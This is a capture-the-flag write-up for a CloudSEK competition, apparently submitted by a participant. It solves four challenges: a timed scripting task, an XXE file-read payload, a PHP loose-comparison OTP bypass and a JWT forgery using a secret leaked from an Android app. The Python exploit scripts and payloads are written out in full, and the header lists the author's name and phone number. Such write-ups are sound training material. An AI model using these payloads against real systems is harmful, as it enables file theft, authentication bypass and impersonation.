=> Hey, CloudSEK Team.

=> My Stats:
:=> pseudo name :  brsrk94
:=> ctf rank: 119
:=> real name : aditya tomar
:=> contact no : 6386032529

---
### Challenge 1 : Nitro
=> Challenge Category: Scripting
=> Challenge Value: 100
=> Challenge Description: *Ready your scripts! Only automation will beat the clock and unlock the flag.*
=> Challenge Instance : [http://15.206.47.5:9090](http://15.206.47.5:9090/)

![](content/cyber/cloudsek/_img/pasted-image-20251206132713.png)
=> here we got a string, and according  to nitro automation description we got that we need to reverse the string value.

=> It describes a task that must be completed within a strict time limit, requiring automation.
**Instructions:**
1. Visit `/task` to get a random string.
2. Reverse the string.
3. Base64-encode the reversed value.
4. Wrap the result in the format: `CSK__{{payload}}__2025`.
5. POST the result to `/submit`.

=> now let's move the http://115.206.47.5:9090/task to see what's there
![](content/cyber/cloudsek/_img/pasted-image-20251206133011.png)

## Analysis
The challenge is a classic scripting task where speed is key. We need to maintain a session (cookies) between the GET request to `/task` and the POST request to `/submit` to ensure the server recognizes us as the same user who requested the task.
### Steps:
1. **Session Management:** Use `requests.Session()` to handle cookies automatically.
2. **Fetch Task:** GET `/task` and parse the HTML to extract the input string.
3. **Process String:**
* Reverse: `string[::-1]`
* Encode: `base64.b64encode()`
4. **Format Payload:** Construct the final string `CSK__{encoded_string}__2025`.
5. **Submit:** POST the payload to `/submit`.

=> So here , i wrote python script to automate this and ask for the required string that we got which will reverse the value of string and give us the flag.
## Solution Script
The following Python script automates the entire process:
```python
import requests, re, base64
s = requests.Session()
u = "http://15.206.47.5:9090"
t = s.get(f"{u}/task").text
v = re.search(r"string: (.*)</p>", t).group(1)[::-1]
p = f"CSK__{base64.b64encode(v.encode()).decode()}__2025"
print(s.post(f"{u}/submit", data=p).text)
```

=> and after executing this script we got the flag
![](content/cyber/cloudsek/_img/pasted-image-20251206134435.png)

---

### Challenge 2: Bad Feedback
=> Challenge Category: Web
=> Challenge Description:  *A company rolled out a shiny feedback form and insists their customers are completely trustworthy. Every feedback is accepted at face value, no questions asked. What can go wrong?*
=> Challenge Value: 100
=> Challenge Instance : [http://15.206.47.5:5000](http://15.206.47.5:5000/)

-> When we start the challenge we see this page: 
![](content/cyber/cloudsek/_img/pasted-image-20251206135005.png)

=> it will take to long if i write everystuff , so .
## Vulnerability
The application is vulnerable to **XML External Entity (XXE)** injection. 
The client-side JavaScript constructs an XML payload from the form input and sends it to the `/feedback` endpoint.
The server parses this XML without disabling external entities, allowing an attacker to define a custom entity that references a local file on the server.

## Exploitation
We intercepted the request (or simply recreated it using Python) and injected a malicious XML payload.
### Payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt" >
]>
<feedback>
    <name>&xxe;</name>
    <message>test</message>
</feedback>
```

=> so i wrote a python script for that.
```python
import requests

url = "http://15.206.47.5:5000/feedback"

xml_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag.txt" >
]>
<feedback>
    <name>&xxe;</name>
    <message>test</message>
</feedback>"""

headers = {
    "Content-Type": "application/xml"
}

try:
    response = requests.post(url, data=xml_payload, headers=headers)
    print("Status Code:", response.status_code)
    print("Response Body:")
    print(response.text)
except Exception as e:
    print(f"Error: {e}")
```

=> After Executing it we'll get our flag
![](content/cyber/cloudsek/_img/pasted-image-20251206135804.png)

---
### Challenge 3: Triangle
=> Challenge Category: Web
=> Challenge Description: *The system guards its secrets behind a username, a password, and three sequential verification steps. Only those who truly understand how the application works will pass all three.Explore carefully. Look for what others overlooked. Break the Trinity and claim the flag.*
=> Challenge Value: 100
=> Challenge Instance : [http://15.206.47.5:8080](http://15.206.47.5:8080/)

-> upon visiting the challenge instance we found: ![](content/cyber/cloudsek/_img/pasted-image-20251206140059.png)
### Initial Inspection
Upon visiting the challenge URL, we are presented with a login form requiring a **Username**, **Password**, and three **One-time Passwords (OTP)**.

Checking the page source revealed an interesting comment left by the developers:
![](content/cyber/cloudsek/_img/pasted-image-20251206140326.png)

=> This hint suggests the presence of backup files (`.bak`) and a file named `google2fa.php`.
### File Discovery
Based on the hint, we checked for common backup files and found:
- `http://15.206.47.5:8080/login.php.bak`
- `http://15.206.47.5:8080/google2fa.php.bak`

## Source Code Analysis
### `login.php`
The `login.php` file handles the authentication logic.

```php
$USER_DB = [
    // Set the initial user
    "admin" => [
        "password_hash" => password_hash("admin", PASSWORD_DEFAULT),
        "key1" => Google2FA::generate_secret_key(),
        "key2" => Google2FA::generate_secret_key(),
        "key3" => Google2FA::generate_secret_key()
    ]
];
```

**Key Findings:**
1.  **Credentials**: The username is `admin` and the password hash corresponds to `admin`.
2.  **Dynamic Keys**: The OTP secret keys (`key1`, `key2`, `key3`) are generated *dynamically* every time the script runs. This means we cannot predict or extract the keys to generate valid OTPs, as they change with every request.

The verification logic:
```php
if (!Google2FA::verify_key($user_data['key1'], $_DATA['otp1'])) {
    json_die('wrong otp1', 'otp1');
}
// ... repeats for otp2 and otp3
```

### `google2fa.php`
We examined the `verify_key` function in `google2fa.php`:

```php
public static function verify_key($b32seed, $key, $window = 4, $useTimeStamp = true) {
    // ... timestamp calculation ...
    $binarySeed = self::base32_decode($b32seed);

    for ($ts = $timeStamp - $window; $ts <= $timeStamp + $window; $ts++)
        if (self::oath_hotp($binarySeed, $ts) == $key) // <--- VULNERABILITY
            return true;

    return false;
}
```

**The Vulnerability**:
The comparison `if (self::oath_hotp($binarySeed, $ts) == $key)` uses the loose equality operator (`==`) instead of strict equality (`===`).

In PHP:
- `self::oath_hotp(...)` returns a generated OTP string (e.g., "123456").
- `$key` is the user-supplied input from `$_DATA['otp1']`.

If we provide a boolean `true` as our input `$key`:
```php
"123456" == true // This evaluates to TRUE in PHP
```

Since the application accepts JSON input (handled by `jsonhandler.php`), we can preserve data types. `json_decode` will convert a JSON `true` into a PHP boolean `true`.

## Exploitation

To exploit this, we need to send a JSON POST request where:
1.  `username` is "admin".
2.  `password` is "admin".
3.  `otp1`, `otp2`, and `otp3` are all set to the boolean value `true`.

### Exploit Script (`solve.py`)

```python
import requests

url = "http://15.206.47.5:8080/login.php"

# Payload with boolean True to bypass loose comparison
payload = {
    "username": "admin",
    "password": "admin",
    "otp1": True,
    "otp2": True,
    "otp3": True
}

headers = {
    "Content-Type": "application/json"
}

response = requests.post(url, json=payload)

print(response.text)
```

=> After executing this we got the flag.
![](content/cyber/cloudsek/_img/pasted-image-20251206140630.png)

---
### Challenge 4: Ticket
=> Challenge Category: Web
=> Challenge Description: *Strike Bank recently discovered unusual activity in their customer portal. During a routine review of their Android app, several clues were uncovered. Your mission is to investigate the information available, explore the associated portal, and uncover the hidden flag. Everything you need is already out there! Connect the dots and complete the challenge.*

*The android package is `com.strikebank.netbanking` and the security review was conducted via `bevigil.com`.*

*Report can also be viewed by visiting the URL with the following format: `https://bevigil.com/report/<package_name>`*
=> Challenge Value: 100

## 1. Reconnaissance via BeVigil
The investigation began with the provided Android package name: `com.strikebank.netbanking`. We accessed the security report on BeVigil:
- **Report URL:** [https://bevigil.com/report/com.strikebank.netbanking](https://bevigil.com/report/com.strikebank.netbanking)
### Key Findings:
1. **Portal URL:**
- Under the **Assets** -> **URL** section, we discovered a hardcoded URL pointing to the bank's internal portal:
- `http://15.206.47.5.nip.io:8443/`
![](content/cyber/cloudsek/_img/pasted-image-20251206141145.png)

1. **Hardcoded Secrets:**
- Under the **Strings** section, we searched for sensitive keywords and found a potential JWT secret. 
![](content/cyber/cloudsek/_img/pasted-image-20251206141546.png)
- Initially, it appeared as `c3RyIWszYjRua0AxMDA5JXN1cDNyIXMzY3IzNw==`.
- upon decoding it through https://cyberchef.io 
![](content/cyber/cloudsek/_img/pasted-image-20251206141721.png)

- **Secret:** `str!k3b4nk@1009%sup3r!s3cr37`

## 2. Portal Analysis
Visiting the discovered portal URL (`http://15.206.47.5.nip.io:8443/`) presented a simple page
![](content/cyber/cloudsek/_img/pasted-image-20251206142140.png)

=> we got this creds , after login through this creds , we get into the portal but there was nothing. 
![](content/cyber/cloudsek/_img/pasted-image-20251206142246.png)

Checking the browser's developer tools (Application -> Cookies) revealed an `auth` cookie containing a JSON Web Token (JWT).
- **Existing Token:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InR1aGluMTcyOSIsImV4cCI6MTc2NTAwMTY1OX0...`
- **Decoded Payload:**
```json

{

"username": "tuhin1729",
"exp": 1765001659
}
```
The token was expired, explaining the error message.

## 3. Exploitation: JWT Forgery
With the signing secret recovered from the Android app's strings, we could forge a valid JWT to impersonate a privileged user.
### Attack Strategy:
1. **Target User:** Change the `username` claim from `tuhin1729` to `admin`.
2. **Validity:** Update the `exp` (expiration) claim to a future timestamp.
3. **Signature:** Sign the new token using the recovered secret `str!k3b4nk@1009%sup3r!s3cr37` and the `HS256` algorithm.

### Exploit Script (`jwt_forge.py`):
```python

import jwt
import time
# Secret found in BeVigil report (Strings section)
SECRET = "str!k3b4nk@1009%sup3r!s3cr37"
def forge_jwt(username, secret):
payload = {
"username": username,
"exp": int(time.time()) + 3600 # Valid for 1 hour
}
encoded = jwt.encode(payload, secret, algorithm="HS256")
return encoded
# Forge token for 'admin'
new_token = forge_jwt("admin", SECRET)
print(f"Forged Admin Token: {new_token}")
```

![](content/cyber/cloudsek/_img/pasted-image-20251206142704.png)

=> i again re-login with :
```lua
username : tuhin1729
password: 123456
```

![](content/cyber/cloudsek/_img/2025-12-06-14-30.png)

```lua
 ✘ jin@parrot  ~/Desktop/cloudsek/web/fourth  python3 jwt_forge.py
--- Analyzing Current JWT ---
Decoded Payload: {'username': 'tuhin1729', 'exp': 1765001659}
Expiration: 1765001659
Current Time: 1765011382
Token is EXPIRED

--- Forging New JWT for 'admin' ---
New Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzY1MDE0OTgyfQ.uTourPN786pbl7uUjPKi-GoCeMxs3e4bf77VsXvJVV0

--- Verifying New Token ---
Successfully verified new token: {'username': 'admin', 'exp': 1765014982}
```

```lua
auth_jwt:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzY1MDE0OTgyfQ.uTourPN786pbl7uUjPKi-GoCeMxs3e4bf77VsXvJVV0
```

=> let'see what happens
okay so on refresh we got the flag
![](content/cyber/cloudsek/_img/pasted-image-20251206143256.png)

---

=> Thank You for this wonderful ctf, i liked the last chall. learned something new.
